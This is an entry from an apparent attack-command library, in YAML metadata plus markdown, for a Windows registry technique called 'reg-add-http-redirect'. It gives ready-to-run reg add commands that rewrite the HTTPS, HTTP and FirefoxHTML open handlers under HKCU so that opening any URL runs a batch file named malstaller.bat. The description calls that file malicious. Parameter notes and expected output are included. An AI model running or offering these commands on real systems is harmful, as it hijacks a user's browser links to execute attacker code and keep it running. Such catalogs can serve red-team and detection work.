---
id: c1b2c3d4-e5f6-7890-abcd-ef1234567894
name: reg-add-http-redirect
type: command
executor: cmd
data: >-
  reg add "HKEY_CURRENT_USER\Software\Classes\https\shell\open\command" /ve /d
  "C:\Users\%USERNAME%\Desktop\malstaller.bat %1" /f
output: The operation completed successfully.
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:19.863Z'
platforms:
  - Windows
tags:
  - registry
verified: false
validated: true
submitted: true
---

# reg-add-http-redirect

## Command

```cmd
reg add "HKEY_CURRENT_USER\Software\Classes\https\shell\open\command" /ve /d "C:\Users\%USERNAME%\Desktop\malstaller.bat %1" /f
```

## Description

This command modifies the HKCU registry to redirect the HTTPS protocol handler to a malicious batch file, passing the URL as %1 for execution during elevated triggers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /ve | Sets the default value | Yes |
| /d | Specifies the data (batch path + %1) | Yes |
| /f | Forces overwrite without prompt | Yes |

## Examples

### Basic Usage

```cmd
reg add "HKEY_CURRENT_USER\Software\Classes\http\shell\open\command" /ve /d "C:\Users\%USERNAME%\Desktop\malstaller.bat %1" /f
```

### Advanced Usage

```cmd
reg add "HKEY_CURRENT_USER\Software\Classes\FirefoxHTML\shell\open\command" /ve /d "C:\Users\%USERNAME%\Desktop\malstaller.bat %1" /f
```

## Expected Output

"The operation completed successfully." indicating the key was updated.

## Related

- [[commands/reg-query-verify]]
